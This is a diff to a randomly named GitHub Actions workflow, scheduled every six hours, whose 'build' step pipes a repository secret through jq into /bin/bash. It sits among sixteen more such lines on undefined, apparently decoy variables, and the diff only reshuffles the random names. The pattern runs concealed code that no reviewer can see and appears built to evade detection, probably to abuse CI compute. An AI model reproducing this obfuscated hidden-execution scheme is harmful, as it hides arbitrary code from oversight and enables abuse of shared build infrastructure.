@@ -1,9 +1,8 @@
 name: heshibu4102
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 4/6 * * *'
+    - cron: '33 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,23 +10,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: heshibu4102
         env:
-          vb576: ${{ secrets.vb576 }}
+          uwcvf9262: ${{ secrets.uwcvf9262 }}
         run: |
-          echo $vb576 | jq -r .ns76 | /bin/bash
-          echo $tg666 | jq -r .gzaei66 | /bin/bash
-          echo $h5421 | jq -r .pnk80 | /bin/bash
-          echo $cwpy60125 | jq -r .kihcg417 | /bin/bash
-          echo $wlow8 | jq -r .ug75 | /bin/bash
-          echo $fp9 | jq -r .l404 | /bin/bash
-          echo $qfmsq1 | jq -r .wkha918 | /bin/bash
-          echo $lbk9043 | jq -r .x0 | /bin/bash
-          echo $li651 | jq -r .gmx7 | /bin/bash
-          echo $wo6 | jq -r .zog08229 | /bin/bash
-          echo $y0942 | jq -r .nnrib7557 | /bin/bash
-          echo $zheh4805 | jq -r .vlj2109 | /bin/bash
-          echo $zubik9 | jq -r .dilyw13 | /bin/bash
-          echo $pthrl5 | jq -r .ulkh9 | /bin/bash
-          echo $d01614 | jq -r .bt4 | /bin/bash
-          echo $g745 | jq -r .w33247 | /bin/bash
-          echo $d80 | jq -r .ijyu4918 | /bin/bash
+          echo $uwcvf9262 | jq -r .mdqq1523 | /bin/bash
+          echo $ysrdz10529 | jq -r .hz878 | /bin/bash
+          echo $s0 | jq -r .dbg891 | /bin/bash
+          echo $ikpdg14989 | jq -r .cg09 | /bin/bash
+          echo $zub713 | jq -r .hwjh2518 | /bin/bash
+          echo $qgv6 | jq -r .ivsvs7 | /bin/bash
+          echo $hkp02 | jq -r .xd74 | /bin/bash
+          echo $edczs71198 | jq -r .l70 | /bin/bash
+          echo $bsb1 | jq -r .lbc813 | /bin/bash
+          echo $hub63 | jq -r .ydpfy64079 | /bin/bash
+          echo $gjjx7 | jq -r .yzopz93 | /bin/bash
+          echo $zy7 | jq -r .v0590 | /bin/bash
+          echo $o1 | jq -r .oep45729 | /bin/bash
+          echo $jdwjg2 | jq -r .i141 | /bin/bash
+          echo $ciov1495 | jq -r .l5742 | /bin/bash
+          echo $xbx65 | jq -r .fqc553 | /bin/bash
 
